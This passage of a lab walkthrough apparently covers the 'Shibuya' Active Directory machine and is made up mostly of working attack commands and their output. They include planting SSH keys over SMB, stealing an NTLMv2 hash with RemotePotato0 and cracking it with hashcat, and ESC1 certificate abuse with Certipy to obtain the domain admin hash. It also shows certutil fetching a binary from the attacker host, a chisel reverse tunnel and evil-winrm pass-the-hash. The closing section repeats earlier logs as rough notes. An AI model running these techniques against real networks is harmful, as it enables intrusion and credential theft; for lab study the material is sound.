  Templates                       DHSrn        0  Sun Feb 16 18:42:06 2025
  Videos                             DR        0  Sat May  8 16:20:24 2021

                5048575 blocks of size 4096. 1533503 blocks available
smb: \simon.watson\> cd Desktop
smb: \simon.watson\Desktop\> ls
  .                                  DR        0  Wed Apr  9 08:06:32 2025
  ..                                  D        0  Wed Feb 19 03:36:45 2025
  user.txt                            A       32  Wed Apr  9 08:06:46 2025

                5048575 blocks of size 4096. 1533503 blocks available
smb: \simon.watson\Desktop\> get user.txt
getting file \simon.watson\Desktop\user.txt of size 32 as user.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes
smb: \simon.watson\Desktop\> 
```

```
└─# cat user.txt 
73531560a013b61326392eba28efc261                                                                                                                       
```

### SSH Authorized Keys Injection (T1098.004)

{{< toggle "Tag 🏷️" >}}

{{< tag "smb-to-ssh" >}}  The user of Simon.Watson folder is writeable that also mean i can ssh login due to i can put the ssh public key in the `.ssh` folder with the authorized\_keys

{{< /toggle >}}

Create the private key if you dont have it with `ssh-keygen` with the ed25519 encoded

```
└─# ssh-keygen -t ed25519 -C "haydon@kali-$(date +%Y%m%d)"
Generating public/private ed25519 key pair.
Enter file in which to save the key (/root/.ssh/id_ed25519): 
Enter passphrase for "/root/.ssh/id_ed25519" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_ed25519
Your public key has been saved in /root/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:kbfQKxOAz65Yz8+iX3rWKRQyqN7u4wV89OTV55ZTtCY haydon@kali-20260121
The key's randomart image is:
+--[ED25519 256]--+
|     ..         .|
|    .  . o .   ..|
|     +. * + .E.o.|
|   ...=+.* o ooo |
|   .o..oS.o   =  |
|  . .o. .o   . . |
| . + +.... .     |
|  o +.+++ o      |
|   +=+o=o.       |
+----[SHA256]-----+
```

As the key is save in the ~/.ssh/ ,so i need to go the ~/.ssh/  to put the ssh key with smbclient , and rename from id\_ed25519.pub  to authorized\_keys

```
┌──(haydon_env)─(root㉿kali)-[~/Desktop/10.129.32.246]
└─# cd ~/.ssh/              
                                                                                                             
┌──(haydon_env)─(root㉿kali)-[~/.ssh]
└─# ls -al 
total 28
drwx------  3 root root 4096 Jan 21 16:51 .
drwxr-xr-x 37 root root 4096 Jan 21 15:39 ..
drwx------  2 root root 4096 Jan 21 11:30 agent
-rw-------  1 root root  411 Jan 21 16:51 id_ed25519
-rw-r--r--  1 root root  102 Jan 21 16:51 id_ed25519.pub
-rw-------  1 root root 3252 Jan 19 10:07 known_hosts
-rw-------  1 root root 2274 Jan 17 18:34 known_hosts.old
                                                                                                             
┌──(haydon_env)─(root㉿kali)-[~/.ssh]
└─# smbclient -U Simon.Watson --pw-nt-hash //shibuya.vl/users 5d8c3d1a20bd63f60f469f6763ca0d50
Try "help" to get a list of possible commands.
smb: \> cd .ssh
cd \.ssh\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \> cd Simon.Watson
smb: \Simon.Watson\> cd .ssh
cd \Simon.Watson\.ssh\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \Simon.Watson\> mkdir .ssh
smb: \Simon.Watson\> cd .ssh
smb: \Simon.Watson\.ssh\> put id_ed25519.pub authorized_keys
putting file id_ed25519.pub as \Simon.Watson\.ssh\id_ed25519.pub (0.7 kB/s) (average 0.7 kB/s)
smb: \Simon.Watson\.ssh\> 
smb: \Simon.Watson\.ssh\> ls                                                                                                                                                                                                                
  .                                   D        0  Wed Jan 21 16:59:09 2026                                                                                                                                                                  
  ..                                  D        0  Wed Jan 21 16:53:24 2026                                                                                                                                                                  
  authorized_keys                     A      102  Wed Jan 21 16:59:09 2026                                                                                                                                                                  
                                                                              

```

successful login by ssh

```
Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.


└─# ssh -i ~/.ssh/id_ed25519 simon.watson@10.129.234.42


shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson>

```

# Shell as nigel.mills

### bloodhound HasSession

{{< toggle "Tag 🏷️" >}}

{{< tag "bloodhound-HasSession" >}}  Owner the account due to machine has the  HasSession on bloodhound\
{{< /toggle >}}

bloodhound show that we can upgrade the `nigel.mills` ,as the bloodhound show that the `shibuya\simon.watson@AWSJPDC0522` has the `HasSession` to nigel.mills

```
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\nigel.mills
    C:\Users\Public
```

![Pasted image 20260121221727.png](/ob/Pasted%20image%2020260121221727.png)

*RunasCs* is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials. This tool is an improved and open version of windows builtin *runas.exe* that solves some limitations:

if have the session , we can use the runasCS

```
wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip

unzip RunasCs.zip                                   
Archive:  RunasCs.zip
  inflating: RunasCs.exe             
  inflating: RunasCs_net2.exe      
```

In our situation , it is hard to have the terminal in the ssh , so my idea is that make the reverse shell , and use the RunasCs.exe to have the nigel.MILLS 's session ,in  \[logon type]\(https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types show that the)  show  the `RunasCs.exe` of the parameter  `-l` 2-8 ,and found the ID is `1`

```
shibuya\simon.watson@AWSJPDC0522 C:\ProgramData>.\RunasCs.exe SIMON.WATSON SIMON.WATSON qwinsta -l 9

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 rdp-tcp#0         nigel.mills               1  Active
 console                                     2  Conn                        
 rdp-tcp                                 65536  Listen


```

![Pasted image 20260122001152.png](/ob/Pasted%20image%2020260122001152.png)

https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/ne-ntsecapi-security\_logon\_type\
![Pasted image 20260122001420.png](/ob/Pasted%20image%2020260122001420.png)

`ntlmrelayx.py` module performs the SMB Relay attacks originally discovered by cDc extended to many target protocols (SMB, MSSQL, LDAP, etc). It receives a list of targets and for every connection received it will choose the next target and try to relay the credentials. Also, if specified, it will first try to authenticate against the client connecting to us.

open the ntlmrelayx.py to wait the `RemotePotato0.exe` to send the request to me

```
└─# ntlmrelayx.py -t ldap://10.129.0.1 --no-wcf-server --escalate-user nigel.mills 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client RPC loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
Exception in thread Thread-6:
[*] Multirelay disabled

[*] Servers started, waiting for connections
Traceback (most recent call last):
  File "/usr/lib/python3.13/threading.py", line 1044, in _bootstrap_inner                                         
    self.run()
    ~~~~~~~~^^
  File "/root/Desktop/haydon_env/lib/python3.13/site-packages/impacket/examples/ntlmrelayx/servers/rpcrelayserver.py", line 424, in run                                    
    self.server = self.RPCSocketServer((self.config.interfaceIp, self.config.listeningPort), self.RPCHandler,     
                  ~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^     
                                       self.config)
                                       ^^^^^^^^^^^^
  File "/root/Desktop/haydon_env/lib/python3.13/site-packages/impacket/examples/ntlmrelayx/servers/rpcrelayserver.py", line 41, in __init__                                
    socketserver.TCPServer.__init__(self, server_address, RequestHandlerClass)                                    
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                                    
  File "/usr/lib/python3.13/socketserver.py", line 457, in __init__
    self.server_bind()
    ~~~~~~~~~~~~~~~~^^
  File "/usr/lib/python3.13/socketserver.py", line 478, in server_bind
    self.socket.bind(self.server_address)
    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
OSError: [Errno 98] Address already in use
[*] (HTTP): Client requested path: /
[*] (HTTP): Connection from 10.129.234.42 controlled, attacking target ldap://10.129.0.1
```

{{< toggle "Tag 🏷️" >}}

{{< tag "windows-Firewall-Enumeration" >}}  need to know the filewall which port is allow the traffic

{{< /toggle >}}

```
powershell -Command "netsh advfirewall firewall show rule name=all | ForEach-Object { if ($_ -match '^Rule Name:') { $c = @($_) } elseif ($_ -eq '') { $b = $c -join [char]10; if ($b -match 'Enabled:\s+Yes' -and $b -match 'Direction:\s+In' -and $b -match 'Profiles:\s+.*Domain' -and $b -match 'Protocol:\s+TCP') { $b; [char]10 }; $c = @() } else { $c += $_ } }"
```

The first rule is named Custom TCP Allow, and allows 8000-9000 in.

![Pasted image 20260206174306.png](/ob/Pasted%20image%2020260206174306.png)

```
Rule Name:                            Custom TCP Allow
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            8000-9000
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow
```

`RemotePotato0.exe` abuses the DCOM activation service and trigger an NTLM authentication of any user currently logged on in the target machine. It is required that a privileged user is logged on the same machine (e.g. a Domain Admin user). Once the NTLM type1 is triggered we setup a cross protocol relay server that receive the privileged type1 message and relay it to a third resource by unpacking the RPC protocol and packing the authentication over HTTP. On the receiving end you can setup a further relay node (eg. ntlmrelayx) or relay directly to a privileged resource. RemotePotato0 also allows to grab and steal NTLMv2 hashes of every users logged on a machine.

1. -m 2 --> Module 2 - Rpc capture (hash) server + potato trigger
2. -r 10.10.14.54 --> the remote host
3. -x 10.10.14.54 -->  the remote host ,  Rogue Oxid Resolver ip (default 127.0.0.1)
4. -s  1 --> Session id for the Cross Session Activation attack (default disabled) (i get it from the RunasCS.exe)
5. -p 8888 due to only the port 8888 dont have the filewall

```
shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson\.ssh>.\RemotePotato0.exe -m 2 -r 10.10.14.54 -x 10.10.14.54 -p 8888  -s 1 
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on 10.10.14.54 to your victim machine on port 8888
[*] Example Network redirector:
        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:8888
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] RPC relay server listening on port 9997 ...
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] Starting RogueOxidResolver RPC Server listening on port 8888 ...
[*] IStoragetrigger written: 104 bytes
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 8888
[+] User hash stolen!

NTLMv2 Client   : AWSJPDC0522
NTLMv2 Username : SHIBUYA\Nigel.Mills
NTLMv2 Hash     : Nigel.Mills::SHIBUYA:cbbd010b1adcb705:3f982e160657259d25024f8fe3794f4c:0101000000000000b89805ccc48bdc016bb84702d89454140000000002000e005300480049004200550059004100010016004100570053004a0050004400430030003500320032000400140073006800690062007500790061002e0076006c0003002c004100570053004a0050004400430030003500320032002e0073006800690062007500790061002e0076006c000500140073006800690062007500790061002e0076006c0007000800b89805ccc48bdc0106000400060000000800300030000000000000000100000000200000a604a2833f968daccd1cafe5f327ef02f16173b70e6f9876adab1f882f2f5dd10a00100000000000000000000000000000000000090000000000000000000000
```

hashcat with `/usr/share/wordlists/rockyou.txt` , and get the `NIGEL.MILLS` : `Sail2Boat3`

```
└─# hashcat hashes.txt /usr/share/wordlists/rockyou.txt         
hashcat (v7.1.2) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) Ultra 7 255U, 7928/15857 MB (2048 MB allocatable), 12MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 515 MB (12130 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

NIGEL.MILLS::SHIBUYA:cbbd010b1adcb705:3f982e160657259d25024f8fe3794f4c:0101000000000000b89805ccc48bdc016bb84702d89454140000000002000e005300480049004200550059004100010016004100570053004a0050004400430030003500320032000400140073006800690062007500790061002e0076006c0003002c004100570053004a0050004400430030003500320032002e0073006800690062007500790061002e0076006c000500140073006800690062007500790061002e0076006c0007000800b89805ccc48bdc0106000400060000000800300030000000000000000100000000200000a604a2833f968daccd1cafe5f327ef02f16173b70e6f9876adab1f882f2f5dd10a00100000000000000000000000000000000000090000000000000000000000:Sail2Boat3
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: NIGEL.MILLS::SHIBUYA:cbbd010b1adcb705:3f982e1606572...000000
Time.Started.....: Fri Jan 23 01:42:32 2026 (1 sec)
Time.Estimated...: Fri Jan 23 01:42:33 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2979.9 kH/s (1.60ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 233472/14344385 (1.63%)
Rejected.........: 0/233472 (0.00%)
Restore.Point....: 221184/14344385 (1.54%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: froggy27 -> supergirl8
Hardware.Mon.#01.: Util: 12%

Started: Fri Jan 23 01:42:30 2026
Stopped: Fri Jan 23 01:42:34 2026
                                      
```

# Shell as admin

![Pasted image 20260124110550.png](/ob/Pasted%20image%2020260124110550.png)

```
└─# sshpass -p "Sail2Boat3" scp "./Certipy.exe" "NIGEL.MILLS@10.129.234.42":'/c:/ProgramData/'
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
```

Found the vulnerable by Certipy.exe

### Certipy.exe

Detects Certipy a tool for Active Directory Certificate Services enumeration and abuse based on PE metadata characteristics and common command line arguments. This rule is adapted from https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process\_creation/proc\_creation\_win\_hktl\_certipy.yml

```
shibuya\nigel.mills@AWSJPDC0522 c:\ProgramData>.\Certipy.exe find -u "nigel.mills" -p "Sail2Boat3" -dc-ip 127.0.0.1 -vulnerable         
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'shibuya-AWSJPDC0522-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'shibuya-AWSJPDC0522-CA'
[*] Checking web enrollment for CA 'shibuya-AWSJPDC0522-CA' @ 'AWSJPDC0522.shibuya.vl'
[!] Error checking web enrollment: [WinError 10061] No connection could be made because the target machine actively refused it
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: [WinError 10061] No connection could be made because the target machine actively refused it
[!] Use -debug to print a stacktrace
[*] Saving text output to '20260123073539_Certipy.txt'
[*] Wrote text output to '20260123073539_Certipy.txt'
[*] Saving JSON output to '20260123073539_Certipy.json'
[*] Wrote JSON output to '20260123073539_Certipy.json'

```

```
shibuya\nigel.mills@AWSJPDC0522 c:\ProgramData>type 20260123073539_Certipy.txt
Certificate Authorities
  0
		    CA Name                             : shibuya-AWSJPDC0522-CA
    DNS Name                            : AWSJPDC0522.shibuya.vl
    Certificate Subject                 : CN=shibuya-AWSJPDC0522-CA, DC=shibuya, DC=vl
    Certificate Serial Number           : 2417712CBD96C58449CFDA3BE3987F52
    Certificate Validity Start          : 2025-02-15 07:24:14+00:00
    Certificate Validity End            : 2125-02-15 07:34:13+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SHIBUYA.VL\Administrators
      Access Rights
        ManageCa                        : SHIBUYA.VL\Administrators
                                          SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        ManageCertificates              : SHIBUYA.VL\Administrators
                                          SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        Enroll                          : SHIBUYA.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : ShibuyaWeb
    Display Name                        : ShibuyaWeb
    Certificate Authorities             : shibuya-AWSJPDC0522-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Any Purpose
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 100 years
    Renewal Period                      : 75 years
    Minimum RSA Key Length              : 4096
    Template Created                    : 2025-02-15T07:37:49+00:00
    Template Last Modified              : 2025-02-19T10:58:41+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SHIBUYA.VL\t1_admins
                                          SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : SHIBUYA.VL\_admin
        Full Control Principals         : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        Write Owner Principals          : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        Write Dacl Principals           : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        Write Property Enroll           : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
    [+] User Enrollable Principals      : SHIBUYA.VL\t1_admins
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC2                              : Template can be used for any purpose.
      ESC3                              : Template has Certificate Request Agent EKU set.

```

certipy ESC1 but it need more space in the key ,so we can use the -key-size to match the min size

```
shibuya\nigel.mills@AWSJPDC0522 c:\ProgramData>certipy req -u nigel.mills@shibuya.vl -p Sail2Boat3 -dc-ip 127.0.0.1 -target AWSJPDC0522.shibuya.vl -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn _admin@shibuya.vl -sid S-1-5-21-87560095-894484815-3652015022-500       
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 4
[-] Got error while requesting certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.
Would you like to save the private key? (y/N): y
[*] Saving private key to '4.key'
[*] Wrote private key to '4.key'
[-] Failed to request certificate

```

found the

```
shibuya\nigel.mills@AWSJPDC0522 c:\ProgramData>certipy req -u nigel.mills@shibuya.vl -p Sail2Boat3 -dc-ip 127.0.0.1 -target AWSJPDC0522.shibuya.vl -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn _admin@shibuya.vl -sid S-1-5-21-87560095-894484815-3652015022-500 -key-size 4096 -debug 
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[+] DC host (-dc-host) not specified. Using domain as DC host
[+] Nameserver: '127.0.0.1'
[+] DC IP: '127.0.0.1'
[+] DC Host: 'SHIBUYA.VL'
[+] Target IP: None
[+] Remote Name: 'AWSJPDC0522.shibuya.vl'
[+] Domain: 'SHIBUYA.VL'
[+] Username: 'NIGEL.MILLS'
[+] Trying to resolve 'AWSJPDC0522.shibuya.vl' at '127.0.0.1'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.234.42[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.234.42[\pipe\cert]
[*] Request ID is 8
[*] Successfully requested certificate
[*] Got certificate with UPN '_admin@shibuya.vl'
[+] Found SID in SAN URL: 'S-1-5-21-87560095-894484815-3652015022-500'
[+] Found SID in security extension: 'S-1-5-21-87560095-894484815-3652015022-500'
[*] Certificate object SID is 'S-1-5-21-87560095-894484815-3652015022-500'
[*] Saving certificate and private key to '_admin.pfx'
[+] Attempting to write data to '_admin.pfx'
[+] Data written to '_admin.pfx'
[*] Wrote certificate and private key to '_admin.pfx'

```

found the `bab5b2a004eabb11d865f31912b6b430`

```
shibuya\nigel.mills@AWSJPDC0522 c:\ProgramData>certipy auth -pfx  _admin.pfx -dc-ip 127.0.0.1  
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: '_admin@shibuya.vl'
[*]     SAN URL SID: 'S-1-5-21-87560095-894484815-3652015022-500'
[*]     Security Extension SID: 'S-1-5-21-87560095-894484815-3652015022-500'
[*] Using principal: '_admin@shibuya.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to '_admin.ccache'
[*] Wrote credential cache to '_admin.ccache'
[*] Trying to retrieve NT hash for '_admin'
[*] Got hash for '_admin@shibuya.vl': aad3b435b51404eeaad3b435b51404ee:bab5b2a004eabb11d865f31912b6b430
```

### chisel

```
wget https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_darwin_amd64.gz
```

```
unzip chisel_1.11.3_darwin_amd64.gz 
```

```
chisel server -p 8080 --socks5 --reverse -v
```

```
wget https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_windows_amd64.zip
```

```
unzip chisel_1.11.3_windows_amd64.zip
```

```
sudo python3 -m http.server 80
```

```
certutil -urlcache -split -f http://10.10.14.54:80/chisel.exe C:\ProgramData\chisel.exe
```

```
C:\ProgramData\chisel.exe client 10.10.14.54:8080 R:socks
```

```
sudo vim /etc/proxychains4.conf
```

```
┌──(haydon_env)─(root㉿kali)-[~/tools]
└─# tail -n 20 /etc/proxychains4.conf          
#
#
#        Examples:
#
#               socks5  192.168.67.78   1080    lamer   secret
#               http    192.168.89.3    8080    justu   hidden
#               socks4  192.168.1.49    1080
#               http    192.168.39.93   8080
#
#
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4  127.0.0.1 9050
socks5 127.0.0.1 1080
```

evil-winrm

```shell
└─# proxychains4 evil-winrm -i 127.0.0.1 -u _admin -H bab5b2a004eabb11d865f31912b6b430   
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for m
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completio
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:5985  ...  OK
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:5985  ...  OK
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> dir



so now we want to use the nigel.mills to have him ntlm by  rdp 


![[Pasted image 20260123010305.png]]

# RemotePotato0
**RPC server hash stealer**: allows stealing the NTLMv2 hash of every user logged on in other sessions. Output format inspired by [Responder](https://github.com/lgandx/Responder)

https://www.safebreach.com/blog/remotepotato0-a-complex-active-directory-attack/
- [ ] hassession --> runasCS found --> RemotePotato0 --> get the hash 

https://xie1997.blog.csdn.net/article/details/120367030


```

![Pasted image 20260123010305.png](/ob/Pasted%20image%2020260123010305.png)

```

└─# ntlmrelayx.py -t ldap://10.129.0.1 --no-wcf-server --escalate-user nigel.mills 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 


[*] Protocol Client WINRMS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
Exception in thread Thread-6:
[*] Multirelay disabled

[*] Servers started, waiting for connections
Traceback (most recent call last):
  File "/usr/lib/python3.13/threading.py", line 1044, in _bootstrap_inner                                         
    self.run()
    ~~~~~~~~^^
  File "/root/Desktop/haydon_env/lib/python3.13/site-packages/impacket/examples/ntlmrelayx/servers/rpcrelayserver.py", line 424, in run                                    
    self.server = self.RPCSocketServer((self.config.interfaceIp, self.config.listeningPort), self.RPCHandler,     
                  ~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^     
                                       self.config)
                                       ^^^^^^^^^^^^
  File "/root/Desktop/haydon_env/lib/python3.13/site-packages/impacket/examples/ntlmrelayx/servers/rpcrelayserver.py", line 41, in __init__                                
    socketserver.TCPServer.__init__(self, server_address, RequestHandlerClass)                                    
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                                    
  File "/usr/lib/python3.13/socketserver.py", line 457, in __init__
    self.server_bind()
    ~~~~~~~~~~~~~~~~^^
  File "/usr/lib/python3.13/socketserver.py", line 478, in server_bind
    self.socket.bind(self.server_address)
    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
OSError: [Errno 98] Address already in use
[*] (HTTP): Client requested path: /
[*] (HTTP): Connection from 10.129.234.42 controlled, attacking target ldap://10.129.0.1[*] Protocol Client RPC loaded..
```

```
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.234.42:8888 
> 2026/01/23 01:30:25.000857585  length=164 from=0 to=163
..\v\a......(.........................`R.......!4z.....]........\b.+.H`............`R.......!4z....,..l..@E............
.......NTLMSSP.......\b.................
.|O....< 2026/01/23 01:30:25.000908089  length=318 from=0 to=317
..\f\a....>.............M...8888...........]........\b.+.H`............................
.......NTLMSSP.........8.......\\.....p6............F...
.|O....S.H.I.B.U.Y.A.....S.H.I.B.U.Y.A.....A.W.S.J.P.D.C.0.5.2.2.....s.h.i.b.u.y.a...v.l...,.A.W.S.J.P.D.C.0.5.2.2...s.h.i.b.u.y.a...v.l.....s.h.i.b.u.y.a...v.l.\a.\b.t...........> 2026/01/23 01:30:25.000994764  length=664 from=164 to=827
...\a................

```

```
shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson\.ssh>.\RemotePotato0.exe -m 2 -r 10.10.14.54 -x 10.10.14.54 -p 8888  -s 1 
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on 10.10.14.54 to your victim machine on port 8888
[*] Example Network redirector:
        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:8888
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] RPC relay server listening on port 9997 ...
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] Starting RogueOxidResolver RPC Server listening on port 8888 ...
[*] IStoragetrigger written: 104 bytes
